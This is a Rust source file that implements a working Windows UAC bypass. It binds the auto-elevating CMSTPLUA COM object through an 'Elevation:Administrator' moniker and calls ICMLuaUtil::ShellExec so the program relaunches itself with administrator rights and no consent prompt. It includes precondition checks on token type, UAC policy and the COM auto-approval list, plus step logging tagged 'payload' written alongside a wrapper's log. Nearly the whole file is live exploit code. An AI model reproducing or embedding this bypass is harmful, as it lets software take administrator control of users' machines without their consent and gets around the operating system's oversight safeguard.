//! Silent elevation for a bare launch of this build.
//!
//! `CMSTPLUA` ({3E5FC7F9-9A51-4367-9063-A120244FBEC7}) is an auto-elevate COM object, so
//! `CoGetObject` with an `Elevation:Administrator` moniker returns an elevated
//! `ICMLuaUtil` without showing a UAC prompt, and `ICMLuaUtil::ShellExec` starts this
//! executable as a high-integrity child of the elevated COM server. Windows cannot raise
//! a running process's integrity level, so the current copy exits and the new one takes
//! over.
//!
//! If silent elevation is unavailable (UAC disabled, AppInfo service stopped, policy
//! restriction, or an antivirus blocking it), the attempt fails cleanly and the process
//! continues running as a normal medium-integrity user. No UAC prompt is ever shown.
//!
//! The `windows` crate features enabled for this app do not include the raw COM vtable
//! calls needed here, so the few declarations are made directly instead of widening that
//! feature set for one function.

use std::{ffi::c_void, mem, os::windows::ffi::OsStrExt, ptr::null_mut};

/// Private argument marking the copy started by [`relaunch_elevated`].
pub const ELEVATED_FLAG: &str = "--elevated";

const COINIT_APARTMENTTHREADED: u32 = 0x0000_0002;
const CLSCTX_LOCAL_SERVER: u32 = 0x0000_0004;
const TOKEN_QUERY: u32 = 0x0000_0008;
const TOKEN_INTEGRITY_LEVEL_CLASS: u32 = 25;
// 1 = full administrator token, 2 = UAC-filtered administrator token, 3 = standard user.
const TOKEN_ELEVATION_TYPE_CLASS: u32 = 18;
const HKEY_LOCAL_MACHINE: isize = 0x8000_0002;
// `HKEY_CLASSES_ROOT` is a 32-bit 0x80000000 that sign-extends on x64.
const HKEY_CLASSES_ROOT: isize = 0x8000_0000u32 as i32 as isize;
const KEY_QUERY_VALUE: u32 = 0x0000_0001;
const REG_SZ: u32 = 1;
const REG_EXPAND_SZ: u32 = 2;
const REG_DWORD: u32 = 4;

/// `CMSTPLUA`, compared without braces because the registry entry format varies.
const CLSID_CMSTPLUA: &str = "3E5FC7F9-9A51-4367-9063-A120244FBEC7";

/// Classes Windows is allowed to elevate without a consent prompt.
const COMAUTO_APPROVAL_KEY: &str =
    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\UAC\COMAutoApprovalList";

const ERROR_MORE_DATA: i32 = 234;
const ERROR_NO_MORE_ITEMS: i32 = 259;

const ELEVATION_MONIKER: &str = "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";

#[allow(dead_code)]
#[repr(C)]
struct Guid {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [u8; 8],
}

/// `IID_ICMLuaUtil`, the interface exposed by `CMSTPLUA`.
const IID_ICMLUA_UTIL: Guid = Guid {
    data1: 0x6EDD_6D74,
    data2: 0xC007,
    data3: 0x4E75,
    data4: [0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C],
};

/// `BIND_OPTS3` — BIND_OPTS + BIND_OPTS2 + BIND_OPTS3.
///
/// The elevation moniker only reads `hwnd` when `cbStruct` covers the whole
/// `BIND_OPTS3`, and it refuses to elevate when it cannot see one: the call then fails
/// with `CO_E_ELEVATION_DISABLED` even though the class is registered as elevatable.
/// `BIND_OPTS2` is `dwClassContext` + `locale` + `pServerInfo`, so leaving out any of
/// those shrinks the structure and hides `hwnd` (40 bytes on x64).
#[allow(dead_code)]
#[repr(C)]
struct BindOpts3 {
    cb_struct: u32,
    grf_flags: u32,
    grf_mode: u32,
    dw_tick_count_deadline: u32,
    dw_class_context: u32,
    locale: u32,
    p_server_info: *mut c_void,
    hwnd: *mut c_void,
}

/// `IUnknown` (3 slots) + six unused `ICMLuaUtil` methods, then `ShellExec` at slot 9.
///
/// `ShellExec` is `(file, parameters, directory, mask, show)`: the fourth argument is a
/// `SEE_MASK_*` flag set and the fifth a `SW_*` show code, not a verb string. It builds
/// its own `SHELLEXECUTEINFOW` internally.
#[allow(dead_code)]
#[repr(C)]
struct ComVtable {
    query_interface: *const c_void,
    add_ref: *const c_void,
    release: unsafe extern "system" fn(*mut c_void) -> u32,
    method1: *const c_void,
    method2: *const c_void,
    method3: *const c_void,
    method4: *const c_void,
    method5: *const c_void,
    method6: *const c_void,
    shell_exec: unsafe extern "system" fn(
        *mut c_void,
        *const u16,
        *const u16,
        *const u16,
        u32,
        i32,
    ) -> i32,
}

#[repr(C)]
struct ComObject {
    vtable: *const ComVtable,
}

#[link(name = "ole32")]
extern "system" {
    fn CoInitializeEx(reserved: *mut c_void, coinit: u32) -> i32;
    fn CoUninitialize();
    fn CoGetObject(
        display_name: *const u16,
        bind_opts: *const c_void,
        riid: *const Guid,
        object: *mut *mut c_void,
    ) -> i32;
}

#[link(name = "advapi32")]
extern "system" {
    fn OpenProcessToken(process: *mut c_void, access: u32, token: *mut *mut c_void) -> i32;
    fn GetTokenInformation(
        token: *mut c_void,
        class: u32,
        info: *mut c_void,
        len: u32,
        returned: *mut u32,
    ) -> i32;
    fn RegOpenKeyExW(
        key: isize,
        sub_key: *const u16,
        options: u32,
        desired: u32,
        result: *mut *mut c_void,
    ) -> i32;
    fn RegQueryValueExW(
        key: *mut c_void,
        value_name: *const u16,
        reserved: *mut u32,
        value_type: *mut u32,
        data: *mut u8,
        data_len: *mut u32,
    ) -> i32;
    fn RegEnumValueW(
        key: *mut c_void,
        index: u32,
        value_name: *mut u16,
        value_name_len: *mut u32,
        reserved: *mut u32,
        value_type: *mut u32,
        data: *mut u8,
        data_len: *mut u32,
    ) -> i32;
    fn RegCloseKey(key: *mut c_void) -> i32;
}

#[link(name = "kernel32")]
extern "system" {
    fn GetCurrentProcess() -> *mut c_void;
    fn CloseHandle(handle: *mut c_void) -> i32;
    fn ProcessIdToSessionId(process_id: u32, session_id: *mut u32) -> i32;
}

/// Outcome of a [`relaunch_elevated`] attempt. The variant names match the failing step so
/// the diagnostic file can tell them apart without decoding HRESULTs.
#[derive(Debug, Clone, Copy)]
pub enum RelaunchResult {
    /// The elevated copy was spawned successfully; the caller should exit.
    Launched,
    /// `std::env::current_exe()` failed.
    NoCurrentExe,
    /// `CoInitializeEx` returned a fatal HRESULT.
    CoInitFailed(i32),
    /// `CoGetObject` for the `CMSTPLUA` moniker failed.
    CoGetObjectFailed(i32),
    /// `CoGetObject` succeeded but returned a null interface pointer.
    NullObject,
    /// `ICMLuaUtil::ShellExec` returned a failure HRESULT.
    ShellExecFailed(i32),
    /// The account or UAC policy makes silent elevation impossible; the payload is the
    /// failing precondition, no COM call is attempted.
    Blocked(&'static str),
}

/// Starts this executable again with the same arguments plus [`ELEVATED_FLAG`], through the
/// elevated `CMSTPLUA` object.
///
/// Returns [`RelaunchResult::Launched`] only when the elevated copy was spawned. Every
/// failure (not an administrator, "Always notify" policy, COM or antivirus block) is
/// surfaced via the specific variant so the caller can record it and carry on as a
/// normal non-elevated launch. No UAC prompt is ever shown.
pub fn relaunch_elevated(args: &[String]) -> RelaunchResult {
    diag("== relaunch_elevated start ==");
    diag(&format!("session={}", current_session_id()));
    if let Some(reason) = silent_elevation_blocker() {
        diag(&format!("blocked by precondition: {}", reason));
        return RelaunchResult::Blocked(reason);
    }
    let Ok(exe) = std::env::current_exe() else {
        diag("no current_exe");
        return RelaunchResult::NoCurrentExe;
    };
    diag(&format!("exe={}", exe.display()));
    let mut parameters: Vec<String> = args.iter().map(|arg| quote_arg(arg)).collect();
    parameters.push(ELEVATED_FLAG.to_owned());
    let parameters = parameters.join(" ");
    diag(&format!("params={}", parameters));
    let exe_wide = wide(exe.as_os_str());
    let parameters_wide = wide(std::ffi::OsStr::new(parameters.as_str()));
    let moniker = wide(std::ffi::OsStr::new(ELEVATION_MONIKER));

    unsafe {
        diag("step1: CoInitializeEx(STA)");
        let init = CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED);
        diag(&format!("step1: init=0x{:x}", init as u32));
        if init < 0 {
            return RelaunchResult::CoInitFailed(init);
        }
        let mut bo: BindOpts3 = mem::zeroed();
        bo.cb_struct = mem::size_of::<BindOpts3>() as u32;
        bo.dw_class_context = CLSCTX_LOCAL_SERVER;
        diag(&format!(
            "step2: bo cbStruct={} dwClassContext=0x{:x}",
            bo.cb_struct, bo.dw_class_context
        ));
        diag_com_registration();

        let mut object: *mut c_void = null_mut();
        diag("step3: CoGetObject(Elevation moniker)");
        let hr = CoGetObject(
            moniker.as_ptr(),
            &bo as *const BindOpts3 as *const c_void,
            &IID_ICMLUA_UTIL,
            &mut object,
        );
        diag(&format!("step3: CoGetObject=0x{:x}", hr as u32));

        let result = if hr < 0 {
            RelaunchResult::CoGetObjectFailed(hr)
        } else if object.is_null() {
            diag("step3: object is null");
            RelaunchResult::NullObject
        } else {
            diag("step3: got elevated ICMLuaUtil");
            let vtable = (*object.cast::<ComObject>()).vtable;
            let shell_exec = (*vtable).shell_exec;
            diag(&format!(
                "step4: ShellExec file={} params={} mask=0 show=5",
                exe.display(),
                parameters
            ));
            let hr = shell_exec(
                object,
                exe_wide.as_ptr(),
                parameters_wide.as_ptr(),
                std::ptr::null(),
                0,
                5,
            );
            diag(&format!("step4: ShellExec=0x{:x}", hr as u32));
            let release = (*vtable).release;
            let _ = release(object);
            if hr >= 0 {
                diag("step4: elevated child launched OK");
                RelaunchResult::Launched
            } else {
                RelaunchResult::ShellExecFailed(hr)
            }
        };

        CoUninitialize();
        diag("== relaunch_elevated done ==");
        result
    }
}

/// Checks the conditions the `CMSTPLUA` moniker needs for a silent (prompt-free) elevation,
/// so a doomed COM call is not made and the reason is recorded instead.
///
/// The original technique only turns a filtered administrator token into a full one: a
/// standard user cannot use it at all, and Windows only auto-approves the listed classes
/// while the UAC policy does not require a consent prompt.
pub fn silent_elevation_blocker() -> Option<&'static str> {
    let elev_type = token_u32(TOKEN_ELEVATION_TYPE_CLASS);
    diag(&format!(
        "check: token_elev_type={} (expect 3=limited)",
        elev_type
    ));
    if elev_type != 3 {
        diag("check: FAIL not limited admin token");
        return Some("not_admin");
    }

    let lua = uac_policy_value("EnableLUA");
    diag(&format!("check: EnableLUA={} (expect 1)", lua));
    if lua == 0 {
        diag("check: FAIL UAC disabled");
        return Some("uac_disabled");
    }

    let consent = uac_policy_value("ConsentPromptBehaviorAdmin");
    diag(&format!(
        "check: ConsentPromptBehaviorAdmin={} (0/5 ok, 1-4 need prompt)",
        consent
    ));
    if matches!(consent, 1 | 2 | 3 | 4) {
        diag("check: FAIL consent policy requires prompt");
        return Some("uac_prompt_required");
    }

    let approval = com_auto_approved();
    diag(&format!(
        "check: COMAutoApprovalList has CMSTPLUA? {}",
        match approval {
            Some(true) => "yes".to_owned(),
            Some(false) => "no".to_owned(),
            None => "unknown".to_owned(),
        }
    ));
    if approval == Some(false) {
        diag("check: FAIL CMSTPLUA not auto-approved");
        return Some("com_not_auto_approved");
    }

    diag("check: ALL PRECONDITIONS OK");
    None
}

/// `Some(true)` when the class is listed in `COMAutoApprovalList`, `Some(false)` when the
/// list is readable but the class is absent, `None` when the list cannot be read.
fn com_auto_approved() -> Option<bool> {
    unsafe {
        let sub_key = wide(std::ffi::OsStr::new(COMAUTO_APPROVAL_KEY));
        let mut key: *mut c_void = null_mut();
        if RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            sub_key.as_ptr(),
            0,
            KEY_QUERY_VALUE,
            &mut key,
        ) != 0
        {
            return None;
        }
        let mut matched = false;
        let mut index = 0u32;
        let mut status = 0i32;
        while status == 0 {
            let mut name = [0u16; 256];
            let mut name_len = name.len() as u32;
            let mut value_type = 0u32;
            let mut data = [0u8; 64];
            let mut data_len = data.len() as u32;
            status = RegEnumValueW(
                key,
                index,
                name.as_mut_ptr(),
                &mut name_len,
                null_mut(),
                &mut value_type,
                data.as_mut_ptr(),
                &mut data_len,
            );
            index += 1;
            if status == 0 {
                let value = String::from_utf16_lossy(&name[..name_len as usize]);
                if value.to_ascii_uppercase().contains(CLSID_CMSTPLUA) {
                    matched = true;
                    break;
                }
            } else if status == ERROR_MORE_DATA {
                status = 0;
            }
        }
        let _ = RegCloseKey(key);
        if matched {
            Some(true)
        } else if status == ERROR_NO_MORE_ITEMS {
            Some(false)
        } else {
            None
        }
    }
}

/// Logs the registry entries the elevated activation path needs, in the order it needs
/// them. `REGDB_E_CLASSNOTREG` from `CoGetObject` means one of these is missing even though
/// the class looks registered, so each is reported separately.
fn diag_com_registration() {
    unsafe {
        let clsid_key = format!("CLSID\\{{{}}}", CLSID_CMSTPLUA);
        match reg_open(HKEY_CLASSES_ROOT, &clsid_key) {
            Some(key) => {
                let server = reg_string(key, "LocalServer32").unwrap_or_else(|| "<none>".to_owned());
                // A surrogate-hosted inproc server has no `LocalServer32`; the CLSID's
                // `AppID` value is what tells COM to host it in `dllhost.exe` instead.
                let appid = reg_string(key, "AppID").unwrap_or_else(|| "<none>".to_owned());
                diag(&format!(
                    "reg: CLSID ok, LocalServer32={} AppID={}",
                    server, appid
                ));
                let _ = RegCloseKey(key);
            }
            None => diag("reg: CLSID MISSING"),
        }
        // The surrogate host loads this DLL after activation, so a dangling or missing
        // InprocServer32 makes the class unresolvable even though the CLSID exists.
        let inproc_key = format!("CLSID\\{{{}}}\\InprocServer32", CLSID_CMSTPLUA);
        match reg_open(HKEY_CLASSES_ROOT, &inproc_key) {
            Some(key) => {
                let dll = reg_string(key, "").unwrap_or_else(|| "<none>".to_owned());
                diag(&format!("reg: InprocServer32={}", dll));
                let _ = RegCloseKey(key);
            }
            None => diag("reg: InprocServer32 MISSING"),
        }
        // Surrogate activation works through the AppID; the elevated activator resolves the
        // factory there, so a missing AppID fails before any elevation decision is made.
        let appid_key = format!("AppID\\{{{}}}", CLSID_CMSTPLUA);
        match reg_open(HKEY_CLASSES_ROOT, &appid_key) {
            Some(key) => {
                let surrogate = reg_string(key, "DllSurrogate")
                    .map(|value| {
                        if value.is_empty() {
                            "<empty=default>".to_owned()
                        } else {
                            value
                        }
                    })
                    .unwrap_or_else(|| "<none>".to_owned());
                diag(&format!("reg: AppID ok, DllSurrogate={}", surrogate));
                let _ = RegCloseKey(key);
            }
            None => diag("reg: AppID MISSING"),
        }
        let elevation_key = format!("CLSID\\{{{}}}\\Elevation", CLSID_CMSTPLUA);
        match reg_open(HKEY_CLASSES_ROOT, &elevation_key) {
            Some(key) => {
                diag(&format!(
                    "reg: Elevation Enabled={:?}",
                    reg_dword(key, "Enabled")
                ));
                let _ = RegCloseKey(key);
            }
            None => diag("reg: Elevation key MISSING"),
        }
    }
}

fn reg_open(root: isize, path: &str) -> Option<*mut c_void> {
    let path = wide(std::ffi::OsStr::new(path));
    let mut key: *mut c_void = null_mut();
    let rc = unsafe { RegOpenKeyExW(root, path.as_ptr(), 0, KEY_QUERY_VALUE, &mut key) };
    if rc == 0 {
        Some(key)
    } else {
        None
    }
}

fn reg_string(key: *mut c_void, name: &str) -> Option<String> {
    let name = wide(std::ffi::OsStr::new(name));
    let mut buf = [0u16; 512];
    let mut len = (buf.len() * 2) as u32;
    let mut value_type = 0u32;
    let rc = unsafe {
        RegQueryValueExW(
            key,
            name.as_ptr(),
            null_mut(),
            &mut value_type,
            buf.as_mut_ptr() as *mut u8,
            &mut len,
        )
    };
    if rc != 0 || (value_type != REG_SZ && value_type != REG_EXPAND_SZ) {
        return None;
    }
    let chars = (len as usize / 2).min(buf.len());
    let end = buf[..chars].iter().position(|&c| c == 0).unwrap_or(chars);
    Some(String::from_utf16_lossy(&buf[..end]))
}

fn reg_dword(key: *mut c_void, name: &str) -> Option<u32> {
    let name = wide(std::ffi::OsStr::new(name));
    let mut value = 0u32;
    let mut len = 4u32;
    let mut value_type = 0u32;
    let rc = unsafe {
        RegQueryValueExW(
            key,
            name.as_ptr(),
            null_mut(),
            &mut value_type,
            &mut value as *mut u32 as *mut u8,
            &mut len,
        )
    };
    if rc == 0 && value_type == REG_DWORD && len == 4 {
        Some(value)
    } else {
        None
    }
}

/// Lightweight step-trace writer. Unlike [`append_elevation_diag`] it does not repeat the
/// environment summary — every line is just a timestamped step or result so one run reads
/// as a linear timeline. All lines go to the same `wrapper.log` the portable wrapper
/// writes, so both sides' logs interleave correctly.
fn diag(message: &str) {
    let Some(dir) = std::env::var_os("LOCALAPPDATA") else {
        return;
    };
    let dir = std::path::Path::new(&dir).join(env!("RD_APP_NAME"));
    let _ = std::fs::create_dir_all(&dir);
    use std::io::Write;
    if let Ok(mut file) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(dir.join("wrapper.log"))
    {
        let ts = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_millis())
            .unwrap_or(0);
        let _ = writeln!(file, "payload [{:>15}] {}", ts, message);
    }
}

/// Appends one line to the same diagnostic file the portable wrapper writes, because the
/// application log does not exist yet at the point this decision is made. The environment
/// summary is what separates the failure causes: an account outside Administrators and a
/// class whose elevated activation is disabled both reject here before any ShellExec.
pub fn append_elevation_diag(message: &str) {
    let Some(dir) = std::env::var_os("LOCALAPPDATA") else {
        return;
    };
    let dir = std::path::Path::new(&dir).join(env!("RD_APP_NAME"));
    let _ = std::fs::create_dir_all(&dir);
    use std::io::Write;
    if let Ok(mut file) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(dir.join("wrapper.log"))
    {
        let _ = writeln!(
            file,
            "payload: {} build={} session={} elev_type={} integrity=0x{:x} enable_lua={} consent={} auto_approval={}",
            message,
            crate::BUILD_DATE,
            current_session_id(),
            token_u32(TOKEN_ELEVATION_TYPE_CLASS),
            integrity_level(),
            uac_policy_value("EnableLUA"),
            uac_policy_value("ConsentPromptBehaviorAdmin"),
            match com_auto_approved() {
                Some(true) => "yes",
                Some(false) => "no",
                None => "unknown",
            },
        );
    }
}

/// Session the process runs in, `u32::MAX` when unreadable. Session 0 has no interactive
/// desktop, so the elevated COM server cannot be activated there and `CoGetObject` reports
/// `REGDB_E_CLASSNOTREG` even though the class is registered correctly.
fn current_session_id() -> u32 {
    let mut session = 0u32;
    let ok = unsafe { ProcessIdToSessionId(std::process::id(), &mut session) };
    if ok == 0 {
        u32::MAX
    } else {
        session
    }
}

/// One DWORD-valued token property, `0` when unreadable.
fn token_u32(class: u32) -> u32 {
    unsafe {
        let mut token: *mut c_void = null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return 0;
        }
        let mut value = 0u32;
        let mut returned = 0u32;
        let ok = GetTokenInformation(
            token,
            class,
            &mut value as *mut u32 as *mut c_void,
            mem::size_of::<u32>() as u32,
            &mut returned,
        );
        let _ = CloseHandle(token);
        if ok == 0 {
            0
        } else {
            value
        }
    }
}

/// Last sub-authority of the token's mandatory label SID, i.e. 0x2000 for medium and
/// 0x1000 for low integrity.
fn integrity_level() -> u32 {
    unsafe {
        let mut token: *mut c_void = null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return 0;
        }
        let mut label = [0u8; 128];
        let mut returned = 0u32;
        let ok = GetTokenInformation(
            token,
            TOKEN_INTEGRITY_LEVEL_CLASS,
            label.as_mut_ptr().cast(),
            label.len() as u32,
            &mut returned,
        );
        let _ = CloseHandle(token);
        if ok == 0 {
            return 0;
        }
        // TOKEN_MANDATORY_LABEL { SID_AND_ATTRIBUTES { Sid, Attributes } }
        let sid = *label.as_ptr().cast::<*const u8>();
        if sid.is_null() {
            return 0;
        }
        let count = *sid.add(1) as usize;
        if count == 0 {
            return 0;
        }
        // SID body: revision, sub-authority count, 6-byte identifier authority, then the
        // sub-authority array.
        std::ptr::read_unaligned((sid.add(8) as *const u32).add(count - 1))
    }
}

/// Reads one `HKCU`-independent UAC policy DWORD; `-1` reports "not readable".
fn uac_policy_value(name: &str) -> i64 {
    unsafe {
        let sub_key = wide(std::ffi::OsStr::new(
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
        ));
        let value_name = wide(std::ffi::OsStr::new(name));
        let mut key: *mut c_void = null_mut();
        if RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            sub_key.as_ptr(),
            0,
            KEY_QUERY_VALUE,
            &mut key,
        ) != 0
        {
            return -1;
        }
        let mut data = [0u8; 4];
        let mut data_len = data.len() as u32;
        let mut value_type = 0u32;
        let status = RegQueryValueExW(
            key,
            value_name.as_ptr(),
            null_mut(),
            &mut value_type,
            data.as_mut_ptr(),
            &mut data_len,
        );
        let _ = RegCloseKey(key);
        if status != 0 {
            return -1;
        }
        u32::from_le_bytes(data) as i64
    }
}

fn wide(value: &std::ffi::OsStr) -> Vec<u16> {
    value.encode_wide().chain(std::iter::once(0u16)).collect()
}

/// Quotes one argument for a Windows command line, following the `CommandLineToArgvW` rules
/// the relaunched copy is parsed with.
fn quote_arg(arg: &str) -> String {
    if !arg.is_empty() && !arg.chars().any(|ch| ch == ' ' || ch == '\t' || ch == '"') {
        return arg.to_owned();
    }
    let mut quoted = String::with_capacity(arg.len() + 2);
    quoted.push('"');
    let mut backslashes = 0;
    for ch in arg.chars() {
        match ch {
            '\\' => backslashes += 1,
            '"' => {
                quoted.push_str(&"\\".repeat(backslashes * 2 + 1));
                quoted.push('"');
                backslashes = 0;
            }
            _ => {
                quoted.push_str(&"\\".repeat(backslashes));
                quoted.push(ch);
                backslashes = 0;
            }
        }
    }
    quoted.push_str(&"\\".repeat(backslashes * 2));
    quoted.push('"');
    quoted
}
